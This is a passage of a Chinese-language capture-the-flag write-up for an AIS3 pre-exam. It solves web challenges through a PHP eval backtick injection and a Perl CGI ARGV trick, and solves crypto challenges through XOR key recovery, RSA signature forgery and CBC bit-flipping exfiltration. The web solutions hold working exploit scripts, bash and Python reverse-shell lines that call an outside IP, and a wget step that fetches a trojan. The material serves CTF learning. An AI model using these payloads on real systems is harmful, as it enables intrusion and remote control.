+$_ = $_GET[<span class="hljs-string">'🍣'</span>];
+<span class="hljs-keyword">if</span> (stripos($_, <span class="hljs-string">'"'</span>) !== <span class="hljs-keyword">false</span> || stripos($_, <span class="hljs-string">"'"</span>) !== <span class="hljs-keyword">false</span>)
+  <span class="hljs-keyword">die</span>(<span class="hljs-string">'GG'</span>);
+<span class="hljs-keyword">eval</span>(<span class="hljs-string">'die("'</span>.substr($_, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>).<span class="hljs-string">'");'</span>);</code></pre><p>16 個 byte 放到 <code>die(&quot; [PAYLOAD] &quot;);</code> 中去 eval，其中 payload 不能包含單雙引號。</p>
+<p>稍微查一下 php 的特性，會發現 <a href="http://php.net/manual/en/language.types.string.php#language.types.string.parsing">php double-quote string 可以放 dollar <code>$</code></a> ，可以用來 expand variables，進一步測試發現還可以做 function call，參考<a href="http://php.net/manual/en/language.types.string.php#language.types.string.parsing">這裡</a> 的 &quot;Complex (curly) syntax&quot;。</p>
+<p>然後 php <a href="http://php.net/manual/en/language.operators.execution.php">backtick</a> 可以用來 call shell，那目標明確：結合兩者直接拿 shell。</p>
+<p>先來個測試的 payload，一般做 proof of concept 的測試我都是用 <code>sleep 3</code>, <code>sh</code>, <code>cat /dev/urandom</code>, <code>yes</code>  之類來看會不會 hang 住，進而測試 RCE 可能性。</p>
+<pre class="hljs"><code>🍣=${`sleep <span class="hljs-number">5</span>`}</code></pre><p>果然真的睡了五秒才回，那可以 RCE 了，基本上可以拿 flag，但能不能拿到 reverse shell 呢？</p>
+<p>長度限制只有 16 bytes，reverse shell 的 payload 落落長很難在 16 bytes 內，那該怎麼拉長自己的 payload ？只好再依靠 php 幫我們一把，我們把 payload 用 get 傳，再靠 PHP interpret 變數並 RCE:</p>
+<pre class="hljs"><code>🍣=${`$_GET[<span class="hljs-number">1</span>]`}&amp;<span class="hljs-number">1</span>=RCE_PAYLOAD</code></pre><p>Python script:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> requests
+payload = <span class="hljs-string">'bash -i &gt;&amp; /dev/tcp/240.1.23/12345 0&gt;&amp;1 2&gt;&amp;1'</span>
+r = requests.get(<span class="hljs-string">'http://104.199.235.135:31333/'</span>, params={<span class="hljs-string">'🍣'</span>:<span class="hljs-string">'${`$_GET[1]`}'</span>, <span class="hljs-string">'1'</span>: payload})
+print(r.text)</code></pre><h3 id="web-4"><a class="header-link" href="#web-4"></a>Web 4</h3>
+<p>先用 <a href="https://github.com/YSc21/webcocktail">scanner</a> 掃到 <code>.git</code> 後用 <a href="https://github.com/internetwache/GitTools">gitdumper</a> 拿下來，可以看到 perl 的 source code:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/perl</span>
+<span class="hljs-comment"># My uploader!</span>
+<span class="hljs-keyword">use</span> strict;
+<span class="hljs-keyword">use</span> warnings;
+<span class="hljs-keyword">use</span> CGI;
+<span class="hljs-keyword">my</span> $cgi = CGI-&gt;new;
+<span class="hljs-keyword">print</span> $cgi-&gt;header();
+<span class="hljs-keyword">print</span> <span class="hljs-string">"&lt;body style=\"background: #caccf7 url('https://i.imgur.com/Syv2IVk.png');padding: 30px;\"&gt;"</span>;
+<span class="hljs-keyword">print</span> <span class="hljs-string">"&lt;p style='color:red'&gt;No BUG Q_____Q&lt;/p&gt;"</span>;
+<span class="hljs-keyword">print</span> <span class="hljs-string">"&lt;br&gt;"</span>;
+<span class="hljs-keyword">print</span> <span class="hljs-string">"&lt;pre&gt;"</span>;
+<span class="hljs-keyword">if</span>( $cgi-&gt;upload(<span class="hljs-string">'file'</span>) ) {
+        <span class="hljs-keyword">my</span> $file = $cgi-&gt;param(<span class="hljs-string">'file'</span>);
+        <span class="hljs-keyword">while</span>(&lt;$file&gt;) {
+                <span class="hljs-keyword">print</span> <span class="hljs-string">"$_"</span>;
+        }
+}
+<span class="hljs-keyword">print</span> <span class="hljs-string">"&lt;/pre&gt;"</span>;</code></pre><p>看了我也不知道要幹麻，那就 Google 一下吧，翻了一下發現這題之前已經出過一模一樣的：</p>
+<ul class="list">
+<li><a href="https://dciets.com/writeups/2016/09/18/csaw-quals-ctf-2016-i-got-id/">https://dciets.com/writeups/2016/09/18/csaw-quals-ctf-2016-i-got-id/</a></li>
+<li><a href="https://tsublogs.wordpress.com/2016/09/18/606/">https://tsublogs.wordpress.com/2016/09/18/606/</a></li>
+<li><a href="https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf">https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf</a></li>
+</ul>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-comment"># Python 3.6.5</span>
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> re
+
+s = requests.session()
+
+<span class="hljs-string">'''
+1. To send multiple files, we have tp use list here
+2. Each element is a tuple, (POST name, (filename, file content))
+3. The filename of ARGV must be empty
+'''</span>
+
+files = [(<span class="hljs-string">'file'</span>, (<span class="hljs-string">''</span>, <span class="hljs-string">'ARGV'</span>)), (<span class="hljs-string">'file'</span>, (<span class="hljs-string">'filename1'</span>, <span class="hljs-string">'content1'</span>))]
+<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+    rce = <span class="hljs-string">'sh -c /readflag|xxd|'</span>
+    r = s.post(<span class="hljs-string">'http://104.199.235.135:31334/cgi-bin/index.cgi?'</span> + lfi_filepath, files=files)
+    <span class="hljs-comment">#print(r.text)</span>
+    print(re.findall(<span class="hljs-string">r'&lt;pre&gt;(.*)&lt;/pre&gt;'</span>, r.text, re.S)[<span class="hljs-number">0</span>])
+
+<span class="hljs-string">'''
+Raw payload:
+
+POST /cgi-bin/index.cgi?/etc/passwd HTTP/1.1
+Host: 104.199.235.135:31334
+User-Agent: python-requests/2.18.4
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Content-Length: 255
+Content-Type: multipart/form-data; boundary=83b02634dc0d43e7992884eb46e3aed5
+
+--83b02634dc0d43e7992884eb46e3aed5
+Content-Disposition: form-data; name="file"; filename=""
+
+ARGV
+--83b02634dc0d43e7992884eb46e3aed5
+Content-Disposition: form-data; name="file"; filename="filename1"
+
+content1
+--83b02634dc0d43e7992884eb46e3aed5--
+'''</span></code></pre><p>可以 RCE 基本上可以拿 flag，但能不能彈 reverse shell 呢？嘗試執行 reverse shell payload 卻發現 bash 馬上關掉，那只好用土一點的方法，先 wget 下載木馬，再執行 reverse shell，這次是 python 2.7 的 <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">reverse shell</a></p>
+<pre class="hljs"><code>python -c <span class="hljs-string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("240.1.2.3",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></code></pre><pre class="hljs"><code><span class="hljs-attribute">wget</span> <span class="hljs-number">240.1.2.3:1234</span> -O /tmp/abcd</code></pre><p>出完全一樣的題目好像不太好(?)</p>
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h3 id="crypto-1"><a class="header-link" href="#crypto-1"></a>Crypto 1</h3>
+<p>忘了，貌似是算完 PoW 就拿到 flag</p>
+<h3 id="crypto-2"><a class="header-link" href="#crypto-2"></a>Crypto 2</h3>
+<p>XOR 題：</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3                                                                                                                   </span>
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">import</span> random
+
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">'flag'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> data:
+    flag = data.read()
+    <span class="hljs-keyword">assert</span>(flag.startswith(<span class="hljs-string">b'AIS3{'</span>))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extend</span><span class="hljs-params">(key, L)</span>:</span> 
+    kL = len(key)
+    <span class="hljs-keyword">return</span> key * (L // kL) + key[:L % kL] 
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">xor</span><span class="hljs-params">(X, Y)</span>:</span> 
+    <span class="hljs-keyword">return</span> bytes([x ^ y <span class="hljs-keyword">for</span> x, y <span class="hljs-keyword">in</span> zip(X, Y)])
+
+key = os.urandom(random.randint(<span class="hljs-number">8</span>, <span class="hljs-number">12</span>))
+plain = flag + key 
+key = extend(key, len(plain))
+cipher = xor(plain, key)
+
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">'flag-encrypted'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> data:
+    data.write(cipher)</code></pre><p>因為他最後會把 key 加到 plain text 上，利用這個特性可以藉由 flag 開頭是 <code>AIS3{</code>推導出剩下的 bytes，基本上就是把 flag rotate 了 k 個 bytes，再跟 flag 本身 xor：</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-comment"># Python 3.6.5</span>
+
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> xor
+
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">'flag.enc'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:
+    c = f.read()
+
+
+<span class="hljs-keyword">for</span> key_len <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>, <span class="hljs-number">13</span>):
+    parts = []
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(c)//key_len + <span class="hljs-number">1</span>):
+        parts.append(c[i*key_len: (i+<span class="hljs-number">1</span>)*key_len])
+        print(parts[<span class="hljs-number">-1</span>].hex())
+    <span class="hljs-comment">#x ^ y = z</span>
+    x = [xor(i, j) <span class="hljs-keyword">for</span> i, j <span class="hljs-keyword">in</span> zip(<span class="hljs-string">b'AIS3{'</span>, c)] + [<span class="hljs-keyword">None</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(key_len - len(<span class="hljs-string">'AIS3{'</span>))]
+    right_rotate = len(parts[<span class="hljs-number">-1</span>])
+    y = x[-right_rotate:] + x[:-right_rotate]
+
+    z = c[-key_len:]
+    z = z[-right_rotate:] + z[:-right_rotate]
+    z = [bytes([i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> z]
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(key_len):
+        <span class="hljs-keyword">if</span> y[i] <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span> <span class="hljs-keyword">and</span> x[i] <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">None</span>:
+            y[i] = xor(z[i], x[i])
+            <span class="hljs-keyword">if</span> x[i-right_rotate] <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span>:
+                x[i-right_rotate] = y[i]
+        <span class="hljs-keyword">if</span> x[i] <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span> <span class="hljs-keyword">and</span> y[i] <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">None</span>:
+            x[i] = xor(z[i], y[i])
+            <span class="hljs-keyword">if</span> y[(i+right_rotate)%key_len] <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span>:
+                y[(i+right_rotate)%key_len] = x[i]
+
+    print(xor(<span class="hljs-string">b''</span>.join(x), c))</code></pre><h3 id="crypto-3-(unsolved,-thanks-to-@how2hack)"><a class="header-link" href="#crypto-3-(unsolved,-thanks-to-@how2hack)"></a>Crypto 3 (unsolved, thanks to @how2hack)</h3>
+<p>Server code:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA
+<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes
+
+<span class="hljs-comment">#from proof import proof</span>
+
+<span class="hljs-comment"># some encoding problem in docker ( not important )</span>
+<span class="hljs-keyword">import</span> io
+<span class="hljs-keyword">import</span> sys
+sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding=<span class="hljs-string">'utf-8'</span>)
+
+<span class="hljs-comment">#with open('flag') as data:</span>
+<span class="hljs-comment">#    flag = data.read()</span>
+
+normal = <span class="hljs-string">'\033[0m'</span>
+bold = <span class="hljs-string">'\033[1m'</span>
+red = <span class="hljs-string">'\033[91m'</span>
+green = <span class="hljs-string">'\033[92m'</span>
+yellow = <span class="hljs-string">'\033[93m'</span>
+blue = <span class="hljs-string">'\033[94m'</span>
+purple = <span class="hljs-string">'\033[95m'</span>
+aquamarine = <span class="hljs-string">'\033[96m'</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cprint</span><span class="hljs-params">(text, color = normal)</span>:</span>
+    <span class="hljs-keyword">if</span> color == normal:
+        print(text)
+    <span class="hljs-keyword">else</span>:
+        print(<span class="hljs-string">'{}{}{}'</span>.format(color, text, normal))
+
+<span class="hljs-comment">#proof()</span>
+
+m = <span class="hljs-string">"""
+I owe you 10 bucks
+- 2018/4/1 Alice
+"""</span>.strip()
+key = RSA.generate(<span class="hljs-number">2048</span>, os.urandom)
+m = int.from_bytes(m.encode(<span class="hljs-string">'utf-8'</span>), <span class="hljs-string">'big'</span>)
+s = key.sign(m, <span class="hljs-number">0</span>)[<span class="hljs-number">0</span>]
+
+cprint(<span class="hljs-string">'◢'</span> + <span class="hljs-string">'■'</span> * <span class="hljs-number">50</span> + <span class="hljs-string">'◣'</span>, bold)
+cprint(<span class="hljs-string">"- 2018/4/1"</span>, green)
+cprint(<span class="hljs-string">"Alice : Here is the receipt for the loan."</span>, yellow)
+cprint(<span class="hljs-string">"m = {}"</span>.format(m))
+cprint(<span class="hljs-string">"Alice : Here is the digital signature (s, n, e) to prove that I actually wrote that receipt."</span>, yellow)
+cprint(<span class="hljs-string">"s = {}"</span>.format(s))
+cprint(<span class="hljs-string">"n = {}"</span>.format(key.n))
+cprint(<span class="hljs-string">"e = {}"</span>.format(key.e))
+cprint(<span class="hljs-string">"Bob : OK, remember to pay me back someday."</span>, aquamarine)
+cprint(<span class="hljs-string">'◥'</span> + <span class="hljs-string">'■'</span> * <span class="hljs-number">50</span> + <span class="hljs-string">'◤'</span>, bold)
+
+cprint(<span class="hljs-string">''</span>)
+cprint(<span class="hljs-string">"🚀  on millions years later.."</span>, red)
+cprint(<span class="hljs-string">''</span>)
+
+cprint(<span class="hljs-string">'◢'</span> + <span class="hljs-string">'■'</span> * <span class="hljs-number">50</span> + <span class="hljs-string">'◣'</span>, bold)
+cprint(<span class="hljs-string">"- 1002018/4/1"</span>, green)
+cprint(<span class="hljs-string">"Bob : Dormammu, I've come to bargain."</span>, aquamarine)
+cprint(<span class="hljs-string">"Alice : Uh..., I'm not Dormammu."</span>, yellow)
+cprint(<span class="hljs-string">"Bob: Whatever..., I think it's time for you to pay me back."</span>, aquamarine)
+cprint(<span class="hljs-string">"Bob : Here is the receipt for the loan and also the signature."</span>, aquamarine)
+
+<span class="hljs-keyword">try</span>:
+    m = int(input(<span class="hljs-string">"m = "</span>))
+    s = int(input(<span class="hljs-string">"s = "</span>))
+    <span class="hljs-keyword">if</span> key.verify(m, (s,)):
+        m = long_to_bytes(m)
+        print(m)
+        print(m.split())
+        print(m.split()[<span class="hljs-number">3</span>])
+        bucks = int(m.split()[<span class="hljs-number">3</span>])
+        print(bucks)
+        <span class="hljs-keyword">if</span> bucks &gt; <span class="hljs-number">10</span>:
+            cprint(<span class="hljs-string">"Alice : Oh crap, I don't have enough money..., maybe this flag can compensate you : {}"</span>.format(flag), yellow)
+        <span class="hljs-keyword">else</span>:
+            cprint(<span class="hljs-string">"Alice : Come on man, it's just 10 bucks..."</span>, yellow)
+        exit(<span class="hljs-number">0</span>)
+    <span class="hljs-keyword">else</span>:
+        cprint(<span class="hljs-string">"Alice : What have you done..."</span>, yellow)
+<span class="hljs-keyword">except</span>:
+    exit(<span class="hljs-number">0</span>)
+
+...</code></pre><p>基本上是要偽造簽名，我一開始嘗試直接爆破 s，嘗試可能的 s 使得 $s^e = m$，並且 m 會讓 <code>int(m.split()[3]) &gt; 10</code>，不過 s 跑了幾千萬都是失敗，因為太難讓 m 出現三個 0x20 (空格) 了。</p>
+<p>既然單純爆破 s 不太可行，那就把原本合法的 m 乘上去吧，畢竟原本合法的 m 有不少的 0x20，這個好性質使得乘上 m 之後，很快就可以搜出合法的解： </p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-comment"># Python 3.6.5</span>
+
+<span class="hljs-comment"># Solution thanks to @how2hack</span>
+<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes
+
+m = <span class="hljs-number">554925652019585156475787890525225102046075682323304548835475744305803283492262994789</span>
+s = <span class="hljs-number">8893931972182818044887642802041512151637835508778733483367383922956088851535543045353394423623009836954355437544623799405164469870666785493058916365730516406144818232329263261760598226562026674786971455782715020921619619272079877118489050655967728826115222391008470575222102106503254745378891954974052584021934609709120680006462744982083961724037574311385291857678940299733481927081819784710368972540801034570491587923992073030931037900174432334370101464769099165656306608605116392023443785561469993626851198599801789525811680963922516035028163499926100820053526995911509771419784466544291151531282528959015443443997</span>
+n = <span class="hljs-number">21232057752203050626327375413774655245866966677562081461618777215050100809614174448121718664073874770580592047257544090518156549247464236449881573516955891064948348640120104781529771203540220265613570642486380465030497213834318682366615946716455109515130588928786185167829699861919862539288169713824716271127284133643717019874393701490287994956317815564214797946176560219681181431433749699809927415253346547229042693265155026780261727400030789693357428715693850685842499335548901588448935551794449164274161376491308273104734354438424848886632452109979780615769063146540382650313788634482118159125354009606248992156239</span>
+e = <span class="hljs-number">65537</span>
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>**<span class="hljs-number">30</span>):
+    t = pow(i, e, n) * m % n 
+    t=  long_to_bytes(t)
+    <span class="hljs-comment">#print(m.split())</span>
+    <span class="hljs-keyword">try</span>:
+        <span class="hljs-keyword">if</span> len(t.split()) &gt;= <span class="hljs-number">4</span> <span class="hljs-keyword">and</span> int(t.split()[<span class="hljs-number">3</span>]) &gt; <span class="hljs-number">10</span>: 
+            print(t)
+    <span class="hljs-keyword">except</span> ValueError:
+        <span class="hljs-keyword">pass</span></code></pre><h3 id="crypto-4"><a class="header-link" href="#crypto-4"></a>Crypto 4</h3>
+<p>Server code:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> os, sys
+<span class="hljs-keyword">import</span> re
+<span class="hljs-keyword">import</span> random
+<span class="hljs-keyword">from</span> urllib.error <span class="hljs-keyword">import</span> HTTPError, URLError
+<span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> urlopen
+<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote
+<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode, b64decode
+<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES
+<span class="hljs-keyword">from</span> proof <span class="hljs-keyword">import</span> proof
+
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">'flag'</span>) <span class="hljs-keyword">as</span> data:
+    flag = data.read()
+<span class="hljs-comment"># simplify mail format</span>
+mail_for_ctfplayer = <span class="hljs-string">'''
+From: thor@ais3.org
+To: ctfplayer@ais3.org
+
+--BOUNDARY
+Type: text
+Welcome to AIS3 pre-exam.
+
+--BOUNDARY
+Type: cmd
+echo 'This is the blog of oalieno'
+web 'https://oalieno.github.io'
+echo 'This is the blog of bamboofox team'
+web 'https://bamboofox.github.io/'
+
+--BOUNDARY
+Type: text
+You can find some useful tutorial on there.
+And you might be wondering where is the flag?
+Just hold tight, and remember that patient is virtue.
+
+--BOUNDARY
+Type: text
+Here is your flag : {}
+
+--BOUNDARY
+Type: text
+Hope you like our crypto challenges.
+Thanks for solving as always.
+I'll catch you guys next time.
+See ya!
+
+--BOUNDARY
+'''</span>.format(flag).lstrip().encode(<span class="hljs-string">'utf-8'</span>)
+
+quotes = [<span class="hljs-string">'Keep on going never give up.'</span>,
+          <span class="hljs-string">'Believe in yourself.'</span>,
+          <span class="hljs-string">'Never say die.'</span>,
+          <span class="hljs-string">"Don't give up and don't give in."</span>,
+          <span class="hljs-string">'Quitters never win and winners never quit.'</span>]
+
+seen = <span class="hljs-keyword">False</span>
+key = os.urandom(<span class="hljs-number">16</span>)
+iv = os.urandom(<span class="hljs-number">16</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pad</span><span class="hljs-params">(text)</span>:</span>
+    L = -len(text) % <span class="hljs-number">16</span>
+    <span class="hljs-keyword">return</span> text + bytes([L]) * L
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">unpad</span><span class="hljs-params">(text)</span>:</span>
+    L = text[<span class="hljs-number">-1</span>]
+    <span class="hljs-keyword">if</span> L &gt; <span class="hljs-number">16</span>:
+        <span class="hljs-keyword">raise</span> ValueError
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, L + <span class="hljs-number">1</span>):
+        <span class="hljs-keyword">if</span> text[-i] != L:
+            <span class="hljs-keyword">raise</span> ValueError
+    <span class="hljs-keyword">return</span> text[:-L]
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_mail</span><span class="hljs-params">(mail)</span>:</span>
+    raw_mail = <span class="hljs-string">b""</span>
+
+    <span class="hljs-comment"># parse many chunk</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+
+        <span class="hljs-comment"># throw away the delimeter</span>
+        _, _, mail = mail.partition(<span class="hljs-string">b'--BOUNDARY\n'</span>)
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> mail:
+            <span class="hljs-keyword">break</span>
+
+        <span class="hljs-comment"># parse Type</span>
+        type_, _, mail = mail.partition(<span class="hljs-string">b'\n'</span>)
+        type_ = type_.split(<span class="hljs-string">b': '</span>)[<span class="hljs-number">1</span>]
+
+        <span class="hljs-comment"># Type: text</span>
+        <span class="hljs-keyword">if</span> type_ == <span class="hljs-string">b'text'</span>:
+            text, _, mail = mail.partition(<span class="hljs-string">b'\n\n'</span>)
+            raw_mail += text + <span class="hljs-string">b'\n'</span>
+
+        <span class="hljs-comment"># Type: cmd</span>
+        <span class="hljs-keyword">elif</span> type_ == <span class="hljs-string">b'cmd'</span>:
+
+            <span class="hljs-comment"># parse many cmd</span>
+            <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+
+                <span class="hljs-comment"># see '\n\n' then continue to next chunk</span>
+                <span class="hljs-keyword">if</span> mail[:<span class="hljs-number">1</span>] == <span class="hljs-string">b'\n'</span>:
+                    mail = mail[<span class="hljs-number">1</span>:]
+                    <span class="hljs-keyword">break</span>
+
+                <span class="hljs-comment"># parse cmd, content</span>
+                cmd, _, mail = mail.partition(<span class="hljs-string">b"'"</span>)
+                content, _, mail = mail.partition(<span class="hljs-string">b"'\n"</span>)
+
+                <span class="hljs-comment"># echo 'content' ( print some text )</span>
+                <span class="hljs-keyword">if</span> cmd.startswith(<span class="hljs-string">b'echo'</span>):
+                    raw_mail += content + <span class="hljs-string">b'\n'</span>
+
+                <span class="hljs-comment"># web 'content' ( preview some of the text on webpage )</span>
+                <span class="hljs-keyword">elif</span> cmd.startswith(<span class="hljs-string">b'web'</span>):
+                    print(quote(content), file=sys.stderr)
+                    x = content.find(<span class="hljs-string">b'//'</span>)
+                    <span class="hljs-keyword">if</span> x != <span class="hljs-number">-1</span>:
+                        url = content[:x].decode(<span class="hljs-string">'utf-8'</span>) + <span class="hljs-string">'//'</span> + quote(content[x+<span class="hljs-number">2</span>:])
+                    <span class="hljs-keyword">else</span>:
+                        url = <span class="hljs-string">'http://'</span> + quote(content)
+                    <span class="hljs-keyword">try</span>:
+                        req = urlopen(url)
+                        text = req.read()
+                        raw_mail += <span class="hljs-string">b'+ '</span> + content + <span class="hljs-string">b'\n'</span>
+                        raw_mail += <span class="hljs-string">b'\n'</span>.join(re.findall(<span class="hljs-string">b'&lt;p&gt;(.*)&lt;/p&gt;'</span>, text)) + <span class="hljs-string">b'\n'</span>
+                    <span class="hljs-keyword">except</span> (HTTPError, URLError) <span class="hljs-keyword">as</span> e:
+                        <span class="hljs-keyword">pass</span>
+    <span class="hljs-keyword">return</span> raw_mail
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_mail</span><span class="hljs-params">(mail)</span>:</span>
+    <span class="hljs-comment"># I am so busy right now, no time to read the mails</span>
+    <span class="hljs-keyword">pass</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getmail</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">global</span> seen
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> seen:
+        aes = AES.new(key, AES.MODE_CBC, iv)
+        mail = aes.encrypt(pad(mail_for_ctfplayer))
+        print(b64encode(mail).decode(<span class="hljs-string">'utf-8'</span>))
+        seen = <span class="hljs-keyword">True</span>
+    <span class="hljs-keyword">else</span>:
+        print(<span class="hljs-string">'you have read all mails.'</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sendmail</span><span class="hljs-params">(mail)</span>:</span>
+    mail = b64decode(mail)
+    aes = AES.new(key, AES.MODE_CBC, iv)
+    mail = unpad(aes.decrypt(mail))
+    print(mail[<span class="hljs-number">8</span>*<span class="hljs-number">16</span>:<span class="hljs-number">10</span>*<span class="hljs-number">16</span>],  file=sys.stderr)
+    mail = parse_mail(mail)
+    read_mail(mail)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">menu</span><span class="hljs-params">()</span>:</span>
+    print(<span class="hljs-string">''</span>)
+    print(<span class="hljs-string">'{:=^20}'</span>.format(<span class="hljs-string">' menu '</span>))
+    print(<span class="hljs-string">'1) ctf player mailbox'</span>)
+    print(<span class="hljs-string">'2) send me a mail'</span>)
+    print(<span class="hljs-string">'3) quit'</span>)
+    print(<span class="hljs-string">'='</span> * <span class="hljs-number">20</span>)
+
+    option = int(input(<span class="hljs-string">'&gt; '</span>).strip())
+    <span class="hljs-keyword">if</span> option == <span class="hljs-number">1</span>:
+        getmail()
+    <span class="hljs-keyword">elif</span> option == <span class="hljs-number">2</span>:
+        mail = input(<span class="hljs-string">'mail : '</span>)
+        sendmail(mail)
+    <span class="hljs-keyword">elif</span> option == <span class="hljs-number">3</span>:
+        print(random.choice(quotes))
+    <span class="hljs-keyword">else</span>:
+        exit(<span class="hljs-number">0</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
+    proof()
+    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+        menu()
+
+main()</code></pre><p>unpad 有好好檢查，沒什麼問題。但這題 padding oracle 仍然可做，不過有 PoW 要做，所以先思考看看有沒有別的作法，唯一比較可疑的是 <code>urlopen</code>，parse mail 回傳的東西不會印出來，那 <code>urlopen</code> 就有點多餘了。</p>
+<p>我們有沒有辦法用 <code>urlopen</code> 去把 flag 傳回來呢？</p>
+<p>先把 block 稍微排一下：</p>
+<pre class="hljs"><code><span class="hljs-symbol">0 </span>b<span class="hljs-comment">'From: thor@ais3.'</span>
+<span class="hljs-symbol">1 </span>b<span class="hljs-comment">'org\nTo: ctfplaye'</span>
+<span class="hljs-symbol">2 </span>b<span class="hljs-comment">'r@ais3.org\n\n--BO'</span>
+<span class="hljs-symbol">3 </span>b<span class="hljs-comment">'UNDARY\nType: tex'</span>
+<span class="hljs-symbol">4 </span>b<span class="hljs-comment">'t\nWelcome to AIS'</span>
+<span class="hljs-symbol">5 </span>b<span class="hljs-comment">'3 pre-exam.\n\n--B'</span>
+<span class="hljs-symbol">6 </span>b<span class="hljs-comment">'OUNDARY\nType: cm'</span>
+<span class="hljs-symbol">7 </span>b<span class="hljs-string">"d\necho 'This is "</span>
+<span class="hljs-symbol">8 </span>b<span class="hljs-comment">'the blog of oali'</span>
+<span class="hljs-symbol">9 </span>b<span class="hljs-string">"eno'\nweb 'https:"</span>
+<span class="hljs-symbol">10 </span>b<span class="hljs-comment">'//oalieno.github'</span>
+<span class="hljs-symbol">11 </span>b<span class="hljs-string">".io'\necho 'This "</span>
+<span class="hljs-symbol">12 </span>b<span class="hljs-comment">'is the blog of b'</span>
+<span class="hljs-symbol">13 </span>b<span class="hljs-string">"amboofox team'\nw"</span>
+<span class="hljs-symbol">14 </span>b<span class="hljs-string">"eb 'https://bamb"</span>
+<span class="hljs-symbol">15 </span>b<span class="hljs-comment">'oofox.github.io/'</span>
+<span class="hljs-symbol">16 </span>b<span class="hljs-string">"'\n\n--BOUNDARY\nTy"</span></code></pre><p>我們可以利用 CBC 的特性，透過更改第 8 個 block 的密文，來更動第 9 個 block 的明文，雖然第 8 個 block 會解密成一堆爛掉的東西，但第 9 個 block 明文完全可控。</p>
+<p>那如果我們把 flag 直接接在後面呢？這樣 <code>urlopen</code> 就會把解密後的 flag 傳回來了。</p>
